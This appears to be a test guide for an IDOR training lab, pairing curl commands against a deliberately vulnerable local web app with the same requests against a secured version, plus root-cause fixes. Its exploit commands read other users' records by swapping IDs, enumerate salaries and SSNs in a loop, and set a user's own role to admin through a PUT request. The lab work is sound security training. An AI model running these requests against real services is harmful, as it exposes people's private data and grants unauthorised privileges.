# IDOR Training Lab — Test Scenarios & Expected Results

This document provides ready-to-run `curl` test cases for each IDOR vulnerability and documents expected scanner output for both the vulnerable and secure applications.

---

## Prerequisites

### Start Both Applications

```bash
bash setup.sh run
```

- Vulnerable app: http://localhost:5001
- Secure app: http://localhost:5002

### Authenticate and Capture Session Cookies

All tests require a valid session cookie. The helper below logs in and saves the cookie to a file:

```bash
# Log in as bob (regular user, Sales dept)
curl -s -c /tmp/bob_vuln.txt -X POST http://localhost:5001/login \
  -d "username=bob&password=bob123" -L -o /dev/null
echo "Bob (vulnerable) logged in"

curl -s -c /tmp/bob_secure.txt -X POST http://localhost:5002/login \
  -d "username=bob&password=bob123" -L -o /dev/null
echo "Bob (secure) logged in"

# Log in as alice (admin)
curl -s -c /tmp/alice_vuln.txt -X POST http://localhost:5001/login \
  -d "username=alice&password=alice123" -L -o /dev/null
echo "Alice (vulnerable) logged in"

curl -s -c /tmp/alice_secure.txt -X POST http://localhost:5002/login \
  -d "username=alice&password=alice123" -L -o /dev/null
echo "Alice (secure) logged in"
```

### Seed ID Reference

After seeding, IDs are consistent across both apps:

| Resource | Owner | ID Range |
|----------|-------|----------|
| Users | alice=1, diana=2, bob=3, charlie=4, eve=5 | 1–5 |
| Orders | bob owns IDs 4–6; alice owns 1–3; others scattered | 1–13 |
| Invoices | bob owns IDs 4–6; alice owns 1–3 | 1–13 |
| Documents | bob owns IDs 4–5; confidential HR docs = 1–3 | 1–11 |
| Tickets | bob owns IDs 4–5; confidential HR tickets = 1–2 | 1–10 |

---

## Test Group 1 — User Profile IDOR (VULN-IDOR-001)

Bob (user ID 3) attempts to read Alice's profile (user ID 1) — which includes salary and SSN.

### Vulnerable App (EXPECTED: DATA RETURNED ✅ FINDING)

```bash
curl -s -b /tmp/bob_vuln.txt http://localhost:5001/profile/1 | \
  grep -E "(salary|ssn|120|Executive)" | head -5
```

Expected output (confirms sensitive data is exposed):
```
$120,000
EXE-001
Alice Johnson
Executive
```

### Secure App (EXPECTED: 403 FORBIDDEN ✅ NO FINDING)

```bash
curl -s -b /tmp/bob_secure.txt -o /dev/null -w "%{http_code}" \
  http://localhost:5002/profile/1
```

Expected output:
```
403
```

---

## Test Group 2 — Order Access IDOR (VULN-IDOR-002)

Bob (user) reads Alice's order (order ID 1).

### Vulnerable App (EXPECTED: DATA RETURNED ✅ FINDING)

```bash
curl -s -b /tmp/bob_vuln.txt http://localhost:5001/orders/1 | \
  grep -E "(Order|alice|Alice|amount|status)" | head -5
```

Expected: Order detail page renders with Alice's order data.

### Secure App (EXPECTED: 403 FORBIDDEN ✅ NO FINDING)

```bash
curl -s -b /tmp/bob_secure.txt -o /dev/null -w "%{http_code}" \
  http://localhost:5002/orders/1
```

Expected output:
```
403
```

---

## Test Group 3 — Invoice Access IDOR (VULN-IDOR-003)

Bob reads Alice's invoice (invoice ID 1) which contains payment information.

### Vulnerable App (EXPECTED: DATA RETURNED ✅ FINDING)

```bash
curl -s -b /tmp/bob_vuln.txt http://localhost:5001/invoices/1 | \
  grep -E "(payment|bank|card|amount|Invoice)" | head -5
```

Expected: Invoice detail page with financial data.

### Secure App (EXPECTED: 403 FORBIDDEN ✅ NO FINDING)

```bash
curl -s -b /tmp/bob_secure.txt -o /dev/null -w "%{http_code}" \
  http://localhost:5002/invoices/1
```

Expected:
```
403
```

---

## Test Group 4 — Document Access IDOR (VULN-IDOR-004)

Bob reads a confidential HR document (doc ID 1) he should not have access to.

### Vulnerable App (EXPECTED: DATA RETURNED ✅ FINDING)

```bash
curl -s -b /tmp/bob_vuln.txt http://localhost:5001/documents/1 | \
  grep -E "(CONFIDENTIAL|salary|SSN|document)" | head -5
```

Expected: Full document content rendered, including confidential markings.

### Secure App (EXPECTED: 403 FORBIDDEN ✅ NO FINDING)

```bash
curl -s -b /tmp/bob_secure.txt -o /dev/null -w "%{http_code}" \
  http://localhost:5002/documents/1
```

Expected:
```
403
```

---

## Test Group 5 — Ticket Access IDOR (VULN-IDOR-005)

Bob reads an HR ticket (ticket ID 1) belonging to another employee.

### Vulnerable App (EXPECTED: DATA RETURNED ✅ FINDING)

```bash
curl -s -b /tmp/bob_vuln.txt http://localhost:5001/tickets/1 | \
  grep -E "(HR|ticket|subject|priority)" | head -5
```

Expected: Ticket subject/body rendered.

### Secure App (EXPECTED: 403 FORBIDDEN ✅ NO FINDING)

```bash
curl -s -b /tmp/bob_secure.txt -o /dev/null -w "%{http_code}" \
  http://localhost:5002/tickets/1
```

Expected:
```
403
```

---

## Test Group 6 — API: User Record Read (VULN-IDOR-006)

Bob queries Alice's full user record via REST API.

### Vulnerable App (EXPECTED: JSON WITH SENSITIVE DATA ✅ FINDING)

```bash
curl -s -b /tmp/bob_vuln.txt http://localhost:5001/api/users/1 | python3 -m json.tool
```

Expected response includes:
```json
{
  "id": 1,
  "username": "alice",
  "full_name": "Alice Johnson",
  "role": "admin",
  "salary": 120000,
  "ssn": "123-45-6789",
  "department": "Executive",
  "email": "alice@company.com"
}
```

### Secure App (EXPECTED: 403 JSON ✅ NO FINDING)

```bash
curl -s -b /tmp/bob_secure.txt http://localhost:5002/api/users/1 | python3 -m json.tool
```

Expected:
```json
{
  "error": "Access denied"
}
```

HTTP status: 403

---

## Test Group 7 — API: Privilege Escalation via Profile Update (VULN-IDOR-007)

Bob attempts to escalate his own role to admin by updating his profile.

### Vulnerable App (EXPECTED: ROLE CHANGED TO ADMIN ✅ CRITICAL FINDING)

```bash
# Step 1: Update bob's role to admin
curl -s -b /tmp/bob_vuln.txt -X PUT http://localhost:5001/api/users/3 \
  -H "Content-Type: application/json" \
  -d '{"role": "admin", "department": "Executive"}' | python3 -m json.tool

# Step 2: Verify the change took effect
curl -s -b /tmp/bob_vuln.txt http://localhost:5001/api/users/3 | \
  python3 -m json.tool | grep role
```

Expected after Step 1:
```json
{
  "message": "User updated"
}
```

Expected after Step 2:
```
"role": "admin",
```

**Impact:** Bob can now access all protected resources as an admin.

### Vulnerable App: Update Another User's Profile (IDOR component)

```bash
# Bob updates Alice's profile
curl -s -b /tmp/bob_vuln.txt -X PUT http://localhost:5001/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"department": "Hacked", "salary": 999999}' | python3 -m json.tool
```

Expected (no access control, update succeeds):
```json
{
  "message": "User updated"
}
```

### Secure App (EXPECTED: 403 ✅ NO FINDING)

```bash
# Bob attempts to update Alice
curl -s -b /tmp/bob_secure.txt -X PUT http://localhost:5002/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"department": "Hacked"}' | python3 -m json.tool

# Bob attempts to escalate his own role
curl -s -b /tmp/bob_secure.txt -X PUT http://localhost:5002/api/users/3 \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}' | python3 -m json.tool
```

Both return:
```json
{
  "error": "Access denied"
}
```

---

## Test Group 8 — API: Orders / Invoices / Documents / Tickets (VULN-IDOR-008 to 011)

These follow the same pattern. Demonstrated for orders; repeat for other resource types.

### Vulnerable App (EXPECTED: DATA RETURNED ✅ FINDING)

```bash
# Order (IDs 1–13)
curl -s -b /tmp/bob_vuln.txt http://localhost:5001/api/orders/1 | python3 -m json.tool

# Invoice
curl -s -b /tmp/bob_vuln.txt http://localhost:5001/api/invoices/1 | python3 -m json.tool

# Document
curl -s -b /tmp/bob_vuln.txt http://localhost:5001/api/documents/1 | python3 -m json.tool

# Ticket
curl -s -b /tmp/bob_vuln.txt http://localhost:5001/api/tickets/1 | python3 -m json.tool
```

### Secure App (EXPECTED: 403 ✅ NO FINDING)

```bash
curl -s -b /tmp/bob_secure.txt -o /dev/null -w "%{http_code}" \
  http://localhost:5002/api/orders/1

curl -s -b /tmp/bob_secure.txt -o /dev/null -w "%{http_code}" \
  http://localhost:5002/api/invoices/1

curl -s -b /tmp/bob_secure.txt -o /dev/null -w "%{http_code}" \
  http://localhost:5002/api/documents/1

curl -s -b /tmp/bob_secure.txt -o /dev/null -w "%{http_code}" \
  http://localhost:5002/api/tickets/1
```

All four return: `403`

---

## Test Group 9 — API: Mass User Enumeration (VULN-IDOR-012)

Bob lists all admin-role users via a query parameter — exposing sensitive data at scale.

### Vulnerable App (EXPECTED: USER LIST RETURNED ✅ FINDING)

```bash
curl -s -b /tmp/bob_vuln.txt "http://localhost:5001/api/users?role=admin" | python3 -m json.tool
```

Expected: Returns a JSON array of all admin users including salary, SSN, and contact info.

```bash
# Full enumeration — enumerate all users
for USER_ID in 1 2 3 4 5; do
  echo "--- User $USER_ID ---"
  curl -s -b /tmp/bob_vuln.txt "http://localhost:5001/api/users/$USER_ID" | \
    python3 -m json.tool | grep -E "(username|salary|ssn|role)"
done
```

### Secure App (EXPECTED: 403 ✅ NO FINDING)

```bash
curl -s -b /tmp/bob_secure.txt -o /dev/null -w "%{http_code}" \
  "http://localhost:5002/api/users?role=admin"
```

Expected: `403`

---

## Automated Scan: Expected Results Summary

### Vulnerable App (http://localhost:5001)

When run with an IDOR scanner or manual testing:

| Finding | Vulnerability ID | Severity | Endpoint |
|---------|-----------------|----------|----------|
| Unauthenticated profile access | VULN-IDOR-001 | HIGH | GET /profile/{id} |
| Cross-user order access | VULN-IDOR-002 | MEDIUM | GET /orders/{id} |
| Cross-user invoice access | VULN-IDOR-003 | HIGH | GET /invoices/{id} |
| Confidential document access | VULN-IDOR-004 | CRITICAL | GET /documents/{id} |
| Cross-user ticket access | VULN-IDOR-005 | MEDIUM | GET /tickets/{id} |
| API user data exposure | VULN-IDOR-006 | HIGH | GET /api/users/{id} |
| API privilege escalation | VULN-IDOR-007 | CRITICAL | PUT /api/users/{id} |
| API cross-user order access | VULN-IDOR-008 | MEDIUM | GET /api/orders/{id} |
| API cross-user invoice access | VULN-IDOR-009 | HIGH | GET /api/invoices/{id} |
| API confidential document access | VULN-IDOR-010 | CRITICAL | GET /api/documents/{id} |
| API cross-user ticket access | VULN-IDOR-011 | MEDIUM | GET /api/tickets/{id} |
| API mass user enumeration | VULN-IDOR-012 | HIGH | GET /api/users?role={role} |

**Expected findings: 12** (all IDOR)

### Secure App (http://localhost:5002)

When the same scanner and test cases are run against the secure app:

| Check | Result |
|-------|--------|
| Cross-user profile access | 403 — blocked |
| Cross-user order/invoice/doc/ticket | 403 — blocked |
| API user data (other user) | 403 — blocked |
| API privilege escalation | 403 — blocked |
| API mass enumeration | 403 — blocked |
| Admin accesses own data | 200 — allowed |
| User accesses own data | 200 — allowed |

**Expected findings: 0**

---

## Boundary / Edge Case Tests

### Non-existent Resource (should return 404, not 500)

```bash
# Both apps should return 404 for missing IDs
curl -s -b /tmp/bob_vuln.txt -o /dev/null -w "%{http_code}" \
  http://localhost:5001/api/orders/9999

curl -s -b /tmp/bob_secure.txt -o /dev/null -w "%{http_code}" \
  http://localhost:5002/api/orders/9999
```

Expected: `404` from both.

**Note:** The secure app returns 403 for IDs that exist but aren't owned by the user, and 404 for IDs that don't exist. This prevents leaking whether a resource exists at all.

### Unauthenticated Access (should redirect to login)

```bash
# No session cookie — should redirect to login
curl -s -o /dev/null -w "%{http_code}" http://localhost:5001/profile/1
curl -s -o /dev/null -w "%{http_code}" http://localhost:5002/profile/1
```

Expected: `302` (redirect to /login) from both apps.

### Admin Can Access All Resources (expected behavior)

```bash
# Alice (admin) reads bob's order in secure app — should SUCCEED
curl -s -b /tmp/alice_secure.txt http://localhost:5002/api/orders/4 | python3 -m json.tool
```

Expected: `200` with order data — admins have elevated access by design.

---

## Audit Log Verification (Secure App)

After running test cases, verify the audit log captured all events:

```bash
# View audit log via API (admin only)
curl -s -b /tmp/alice_secure.txt http://localhost:5002/api/audit | python3 -m json.tool | head -60
```

Expected: JSON array of access events, each containing:
- `timestamp`
- `username`
- `action` (e.g., `VIEW_PROFILE`, `VIEW_ORDER`)
- `resource_type`
- `resource_id`
- `outcome` (`ALLOWED` or `DENIED`)

Denied events from bob's tests should appear with `outcome: "DENIED"`.

---

## Quick Reset Between Test Runs

```bash
bash setup.sh reset
```

This wipes both SQLite databases and reseeds them with fresh data — useful when a test has mutated data (e.g., after the privilege escalation test).

---

## Comparison: Root Cause of Each Vulnerability

| Vulnerable Code Pattern | Secure Fix Applied |
|---|---|
| `user = get_user(user_id)` — no ownership check | `check_ownership(user.id)` enforced |
| `order = get_order(order_id)` — returns any order | `WHERE id=? AND user_id=?` query |
| PUT `/api/users/<id>` allows `role` field | `role` and `department` stripped for non-admins |
| `/api/users?role=admin` works for all users | Endpoint restricted to admins only |
| No logging | Every access logged to `audit_logs` with outcome |
| API returns `salary`, `ssn` to all | Sensitive fields stripped for non-admin callers |
